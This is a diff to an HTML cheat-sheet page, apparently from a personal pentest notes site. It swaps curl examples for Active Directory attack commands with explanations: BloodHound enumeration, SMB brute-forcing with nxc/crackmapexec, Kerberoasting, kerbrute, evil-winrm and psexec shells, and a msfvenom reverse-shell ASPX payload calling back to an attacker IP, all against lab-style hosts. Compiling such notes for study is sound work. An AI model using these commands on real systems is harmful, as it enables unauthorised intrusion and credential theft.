@@ -11,16 +11,93 @@
 <body>
     <h1></h1>
     <ul>
-        <li><code>$ curl https://example.com
-        </code> <br><br>> retrieve the HTML content of the specified URL <br><br></li>
+        <li><code>$ bloodhound-python --dns-tcp-ns 10.10.11.108 d return.local -u svc-printer -p 'ledFg4301211' -c all > ldap_enum
+        </code><br><br>
+        > BloodHound used for Active Directory enumeration and attack simulation <br>
+        > <span class="glow">--dns-tcp-ns 10.10.11.108</span> Tells the tool to use TCP-based DNS resolution via the nameserver at IP 10.10.11.108 <br>
+        > <span class="glow">d return.local</span>	Specifies the Active Directory domain name (return.local) that you are querying. <br>
+        ><span class="glow">-u & -p</span> 	Username & password  to authenticate to the domain (svc-printer). <br>
+        > <span class="glow">-c all</span>	Collect all types of supported data (users, groups, computers, sessions, trusts, ACLs, GPOs, etc.) <br>
+        > <span class="glow">> ldap_enum</span>	Redirects the output to a file named ldap_enum</li>
+    </ul>
+<!-- crackmapexec  -->
+    <h1>crackmapexec</h1>
+    <ul>
+        <li><code>$ crackmapexec smb 10.10.10.10 --share -u 'dontknow' -p ''
+        </code> <br><br>
+            > used to enumerate SMB shares on the target 10.10.10.134 using the username dontknow and a blank (empty) password. <br>
+        <br><code>crackmapexec winrm 10.10.10.10 -u 'tony' -p 'liltony'</code><br><br>
+        > check if the given credentials are valid for WinRM (Windows Remote Management) <br>
+        > Tries to authenticate to the WinRM service (used for remote PowerShell access on Windows). <br>
+        > If the credentials are valid and WinRM is enabled, it will confirm access. <br>
+        </li> 
+    </ul>
+<!-- Evil-WinRM -->
+    <h1>Evil-WinRM</h1>
+    <ul>
+        <li><code>$ evil-winrm -i IpAddress -u 'userName' -p 'passWord'
+        </code> <br><br>
+        > This tool, used to create a remote shell on a Windows machine over WinRM (Windows Remote Management).</li>
+    </ul>
+    <!-- GetUserSPNs -->
+    <h1>GetUserSPNs.py</h1>
+    <ul>
+        <li><code>$ GetUserSPNs.py -request -dc-ip 10.10.10.10 active.htb/svc_tags
+        </code> <br> <br>> "GetUserSPNs.py" The Impacket script used to enumerate user accounts with SPNs. <br>
+        > "-request"	Tells the script to request a service ticket (TGS) for each SPN found.
+        <br>> "-dc-ip 10.10.10.10"	Specifies the IP address of the Domain Controller to query.
+        <br>> "active.htb/svc_tags"	Login credentials in the format DOMAIN/USERNAME. <br><span>></span> You'll be prompted for the password unless provided explicitly.
+        <br>> <a style="text-decoration: none; color: rgb(14, 119, 216);" href="https://srimantb.github.io/posts/windows/Kerberoasting.html">Learn more about it</a></li>
+    </ul>
+    <!-- kerbrute_linux_amd64  -->
+     <h1>kerbrute_linux_amd64 </h1>
+     <ul>
+        <li><code>kerbrute_linux_amd64 userenum -d office.htb /usr/share/wordlist -t 100 10.10.11.3</code><br><br>
+        > <span class="glow">kerbrute_linux_amd64</span> is used to enumerate valid Active Directory usernames via Kerberos on a Windows domain controller</li>
+     </ul>
+<!-- msfvenom -->
+    <h1>msfvenom</h1>
+    <ul>
+        <li><code>$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.3 LPORT=1234 -f aspx -o payload.aspx
+        </code><br><br>
+        > <span class="glow">msfvenom</span> Metasploit payload generation tool. <br>
+        > <span class="glow">-p windows/meterpreter/reverse_tcp	</span> Payload: Creates a reverse Meterpreter shell for Windows. <br>
+        > <span class="glow">LHOST=10.10.14.3</span> The attacker's IP (your IP) to connect back to. <br>
+        > <span class="glow">LPORT=1234</span> The port your listener will be listening on. <br>
+        > <span class="glow">-f aspx</span> Format of the payload – here, it's an ASPX web shell. <br>
+        > <span class="glow"> -o payload.aspx</span>Output file name – saves the payload as payload.aspx</li>
+    </ul>
+<!--  -->
+    <h1>nxc</h1>
+    <ul>
+        <li><code>$ nxc smb 10.10.11.3 -u user.txt -p pass.txt --continue-on-success</code><br><br>
+        > a brute-forcing tool for SMB logins</li>
+    </ul>
+<!-- psexec -->
+    <h1>psexec.py</h1>
+    <ul>
+        <li><code>psexec.py 'anno:p3nest!@10.10.10.10'
+        </code><br><br>> It's Impacket's script to get a semi-interactive shell on a remote Windows machine over SMB</li>
+    </ul>
+    <!-- smbclient -->
+    <h1>smbclient</h1>
+    <ul>
+        <li><code>$ smbclient --no-pass -L //10.10.10.10
+        </code> <br><br>> lists the shared resources (like folders or printers) available on the SMB server at IP address 10.10.10.10 without using a password. <br><br></li>
     </ul>
     <ul>
-        <li><code>$ curl -X GET https://api.example.com/resource
-        </code> <br><br>> send a GET request <br><br></li>
+        <li><code>$ smbclient \\\\10.10.10.10/shareName
+        </code> <br><br>> Connects to the SMB share named shareName on the server at IP address 10.10.10.10 <br><br></li>
     </ul>
     <ul>
-        <li><code>$ curl -X POST -d "key1=value1&key2=value2" https://api.example.com/resource
-        </code> <br><br>> send a POST request with data <br><br></li>
+        <li><code>$ smbclient //10.10.10.10/Users -U SVC_TGS
+        </code> <br><br>> Connects to the Users SMB share on 10.10.10.10 using the username SVC_TGS. <br>
+        > It may prompt you for the password of the SVC_TGS user. <br><br></li>
+    </ul>
+    <h1>smbmap</h1>
+    <ul>
+        <li><code>$ smbmap -H 10.10.10.10 -u SVG_TGS -p passwordfortheUser</code> <br><br> > It checks permissions (read/write) for each share the user can access.
+        </li>
     </ul>
     <button onclick="goBack()">Back</button>
 
